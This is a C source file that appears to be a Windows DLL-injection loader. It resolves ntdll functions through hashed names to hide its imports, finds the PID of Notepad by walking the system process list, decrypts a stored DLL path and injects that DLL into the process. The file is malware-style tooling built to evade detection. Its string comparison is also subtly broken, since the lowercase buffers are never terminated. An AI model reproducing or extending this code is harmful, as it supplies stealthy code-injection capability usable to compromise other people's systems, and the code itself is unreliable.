#include <windows.h>
#include "injection.h"


typedef struct { ULONG a; ULONG b; BYTE c[48]; S_UNI d; ULONG e; HANDLE f; } S_PROC, *PS_PROC;

DWORD find_pid(const char* name) {
    HMODULE h_ntdll = get_base(NULL);
    F_QRY f_qry = (F_QRY)resolve(h_ntdll, 0x8E2C1AA0); 
    F_ALC f_alc = (F_ALC)resolve(h_ntdll, 0xc66d2fcc);
    F_FRE f_fre = (F_FRE)resolve(h_ntdll, 0x0c6a2f1b);

    if (!f_qry || !f_alc || !f_fre) return 0;

    SIZE_T sz = 0x10000;
    PVOID buf = NULL;
    NTSTATUS st = f_alc((HANDLE)-1, &buf, 0, &sz, 0x3000, 0x04);
    if (st != 0 || !buf) return 0;

    ULONG ret_len = 0;
    st = f_qry(5, buf, (ULONG)sz, &ret_len);

    while (st == 0xC0000004L) {
        sz = 0; f_fre((HANDLE)-1, &buf, &sz, 0x8000);
        sz = ret_len; buf = NULL;
        st = f_alc((HANDLE)-1, &buf, 0, &sz, 0x3000, 0x04);
        if (st != 0 || !buf) return 0;
        st = f_qry(5, buf, (ULONG)sz, &ret_len);
    }

    if (st != 0) { sz = 0; f_fre((HANDLE)-1, &buf, &sz, 0x8000); return 0; }

    PS_PROC p = (PS_PROC)buf;
    while (TRUE) {
        if (p->d.c != NULL) {
            char ansi[256] = {0};
            int len = p->d.a / 2;
            if (len > 255) len = 255;
            for (int i = 0; i < len; i++) ansi[i] = (char)p->d.c[i];
            
            // Case-insensitive compare
            char name_lower[256], ansi_lower[256];
            for (int i = 0; name[i]; i++) name_lower[i] = (name[i] >= 'A' && name[i] <= 'Z') ? name[i] + 32 : name[i];
            for (int i = 0; ansi[i]; i++) ansi_lower[i] = (ansi[i] >= 'A' && ansi[i] <= 'Z') ? ansi[i] + 32 : ansi[i];
            
            if (strcmp(name_lower, ansi_lower) == 0) {
                DWORD pid = (DWORD)(DWORD_PTR)p->f;
                sz = 0; f_fre((HANDLE)-1, &buf, &sz, 0x8000);
                return pid;
            }
        }
        if (p->a == 0) break;
        p = (PS_PROC)((PBYTE)p + p->a);
    }

    sz = 0; f_fre((HANDLE)-1, &buf, &sz, 0x8000);
    return 0;
}

int main(void) {
    WCHAR dll_path[256];
    decrypt_path(dll_path, 256);
    
    DWORD pid = find_pid("Notepad");
    if (pid == 0) return EXIT_FAILURE;

    SIZE_T path_size = (wcslen(dll_path) + 1) * sizeof(WCHAR);
    if (!inject(pid, dll_path, path_size)) return EXIT_FAILURE;

    return EXIT_SUCCESS;
}